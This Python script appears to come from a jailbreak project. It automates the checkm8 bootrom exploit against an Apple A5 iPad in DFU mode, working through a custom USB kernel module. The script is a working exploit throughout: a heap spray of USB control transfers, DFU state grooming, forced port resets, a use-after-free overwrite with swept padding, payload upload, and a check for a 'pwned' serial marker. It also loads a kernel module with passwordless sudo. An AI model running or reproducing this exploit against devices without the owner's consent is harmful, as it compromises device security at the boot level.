#!/usr/bin/env python3
"""pwn-pipeline.py - the complete host-only checkm8 A5 flow, unattended.

One DFU dance from the user, then this does everything:

  P1  619x 0x80 CYC heap spray + 1x 0x81 (feng shui, real serves)
  S2  module pushes: set-state, zero DNLOAD, 2x GETSTATUS
      knife-edge: DNLOAD wLength 0x700, exactly 0x6C0 data, no status
  P2  raw0reset PR (chip re-enters DFU, sprayed heap survives;
      khd re-enumerates, hook recaptures) - never the kernel reset
  P3  window sweep (AA probes + readback) -> on serve:
      arm (crit-IN) -> UAF write (pad) -> payload -> PR -> verify
      pad sweeps 0x6C0 outward; every serve-window one pad
"""
import argparse
import ctypes
import fcntl
import importlib.util
import os
import struct
import subprocess
import sys
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS = os.path.join(REPO, 'tools')

sp = importlib.util.spec_from_file_location('pwn', os.path.join(TOOLS, 'checkm8-a5-pwn.py'))
P = importlib.util.module_from_spec(sp)
sp.loader.exec_module(P)

IOC_CYC = (1 << 30) | (32 << 16) | (ord('R') << 8) | 5
IOC_PUSH = (1 << 30) | (32 << 16) | (ord('R') << 8) | 1
IOC_STATE = (2 << 30) | (40 << 16) | (ord('R') << 8) | 3
RB_SIZE = 4 + 4 + 0x1000
IOC_RW = (3 << 30) | (RB_SIZE << 16) | (ord('R') << 8) | 7
IOC_PORTRESET = (3 << 30) | (16 << 16) | (ord('R') << 8) | 12

SPRAY = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x80, 0x00])
CRIT  = bytes([0x80, 0x06, 0x03, 0x03, 0x0A, 0x04, 0x81, 0x00])
PROBE = SPRAY
UAF   = bytes([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00])
DNL   = bytes([0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02])


def cyc(fd, setup, data, settle_us=1000):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sIBBHIIQ', bytes(setup), len(data), 1, 1, 0,
                      settle_us, 0, ctypes.addressof(arr))
    try:
        fcntl.ioctl(fd, IOC_CYC, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def push(fd, setup, data, has_status=0, dir_in=0):
    arr = (ctypes.c_ubyte * max(len(data), 1)).from_buffer_copy(
        bytes(data) if data else b'\x00')
    txn = struct.pack('<8sI4BQII', bytes(setup), len(data),
                      1 if data else 0, has_status,
                      1 if dir_in else 0, 0,
                      ctypes.addressof(arr), 0, 0)
    try:
        fcntl.ioctl(fd, IOC_PUSH, txn, True)
        return 0
    except OSError as e:
        _ = arr
        return -e.errno


def readback(fd, n=16):
    rb = bytearray(RB_SIZE)
    struct.pack_into('<I', rb, 0, n)
    fcntl.ioctl(fd, IOC_RW, rb, True)
    st, = struct.unpack_from('<I', rb, 4)
    return st, bytes(rb[8:8 + n])


def state(fd):
    buf = bytearray(40)
    fcntl.ioctl(fd, IOC_STATE, buf, True)
    return struct.unpack_from('<QIIIIIIII', buf, 0)


def pr_raw():
    subprocess.run(['sudo', '-n', 'insmod', '/tmp/raw0rb/raw0reset.ko',
                    'bdf=0000:04:00.4', 'port=5', 'mode=1'],
                   capture_output=True, timeout=25)
    subprocess.run(['sudo', '-n', 'rmmod', 'raw0reset'],
                   capture_output=True, timeout=15)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--wait', type=float, default=90.0)
    ap.add_argument('--leak', type=int, default=619)
    args = ap.parse_args()

    payload, overwrite = P.load_payloads('classic')
    print('*** PIPELINE: payload=%d overwrite=%d ***'
          % (len(payload), len(overwrite)))

    print('put the iPad in DFU now (fresh dance AFTER a force-restart)')
    syspath, sys_serial = P.sysfs_dfu(timeout=args.wait)
    if not syspath:
        print('no DFU appeared')
        return 1
    print('DFU arrived; serial: %r' % sys_serial)

    fd = os.open('/dev/raw0', os.O_RDWR)
    f = state(fd)
    if not f[5]:
        print('[module] no capture - reload module and re-dance')
        os.close(fd)
        return 1
    print('[module] slot=%d state=1' % f[1])

    # ---------------- P1: spray ----------------
    t0 = time.time()
    errs = {}
    n_ok = 0
    for i in range(args.leak):
        rc = cyc(fd, SPRAY, b'\x00' * 0x80)
        if rc == 0:
            n_ok += 1
        else:
            errs[-rc] = errs.get(-rc, 0) + 1
        if (i + 1) % 100 == 0:
            print('[spray] %d/%d ok=%d errs=%r %.1fs'
                  % (i + 1, args.leak, n_ok, errs, time.time() - t0))
    rc = cyc(fd, CRIT, b'\x00' * 0x41)
    print('[spray] final 0x81 rc=%d ok=%d/%d' % (rc, n_ok, args.leak))

    # ---------------- S2 controls + knife-edge ----------------
    rc = push(fd, bytes([0x21, 0x01, 0, 0, 0, 0, 0x40, 0x00]),
              b'\xCC' * 0x40, has_status=1, dir_in=0)
    print('[s2] set-state rc=%d' % rc)
    rc = push(fd, bytes([0x21, 0x01, 0, 0, 0, 0, 0x00, 0x00]),
              b'', has_status=1, dir_in=0)
    print('[s2] zero DNLOAD rc=%d' % rc)
    for n_ in (1, 2):
        rc = push(fd, bytes([0xA1, 0x03, 0, 0, 0, 0, 0x06, 0x00]),
                  b'\x00' * 6, has_status=1, dir_in=1)
        print('[s2] GETSTATUS#%d rc=%d' % (n_, rc))
    rc = cyc(fd, bytes([0x21, 0x01, 0, 0, 0, 0, 0x00, 0x07]), b'\x00' * 0x6C0)
    print('[s2] KNIFE-EDGE rc=%d' % rc)

    # ---------------- P2: PR heal ----------------
    print('[P2] raw0reset PR (chip re-enters DFU, spray survives)')
    pr_raw()

    # ---------------- P3: sweep windows, fire ----------------
    pads = [0x6c0]
    for k in range(1, 28):
        pads += [0x6c0 + 0x40 * k, 0x6c0 - 0x40 * k]
    pads = [p for p in pads if 0x40 <= p <= 0x1000]
    pad_idx = 0

    for r in range(80):
        print('== window round %d (pad 0x%03x) ==' % (r, pads[pad_idx % len(pads)]))
        f_pre = state(fd)
        pr_raw()
        t0 = time.time()
        fresh = False
        f = f_pre
        while time.time() - t0 < 20.0:
            f = state(fd)
            if f[5] and (f[6] != f_pre[6] or f[7] != f_pre[7] or f[4] != f_pre[4]):
                fresh = True
                break
            time.sleep(0.005)
        if not fresh:
            continue

        t0 = time.time()
        shots = 0
        eio = 0
        served = False
        while time.time() - t0 < 4.0:
            rc = cyc(fd, PROBE, b'\xAA' * 0x80)
            if rc == 0:
                shots += 1
                st, data = readback(fd, 16)
                if data != b'\xAA' * 16:
                    served = True
                    print('   window (shot %d): %s' % (shots, data.hex()))
                    break
            else:
                eio += 1
                if eio > 3:
                    break
                time.sleep(0.05)
        if not served:
            print('   silent (%d shots)' % shots)
            continue

        pad = pads[pad_idx % len(pads)]
        pad_idx += 1
        print('   FIRE pad=0x%03x' % pad)
        rc = cyc(fd, CRIT, b'\x00' * 0x41)
        st, arm = readback(fd, 32)
        print('   ARM rc=%d rb=%s' % (rc, arm.hex()))
        rc = cyc(fd, UAF, b'\xCC' * pad + overwrite)
        print('   UAF(%dB) rc=%d' % (pad + 64, rc))
        rc = cyc(fd, DNL, b'\xCC' * 0x40 + payload)
        print('   payload rc=%d' % rc)

        buf = bytearray(struct.pack('<IIII', 1, 0, 0, 0))
        fcntl.ioctl(fd, IOC_PORTRESET, buf, True)
        t0 = time.time()
        pwned = False
        while time.time() - t0 < 12.0:
            serial = P.sysfs_dfu(timeout=2.0)[1]
            if serial:
                print('   serial: %r' % serial)
                pwned = P.PWN_MARKER in serial
                break
            pr_raw()
        if pwned:
            print('*** PWNED DFU - host-only checkm8 A5 achieved '
                  '(pad 0x%03x) ***' % pad)
            os.close(fd)
            return 0
        print('   not pwned - next pad')

    print('exhausted window rounds')
    os.close(fd)
    return 2


if __name__ == '__main__':
    sys.exit(main())
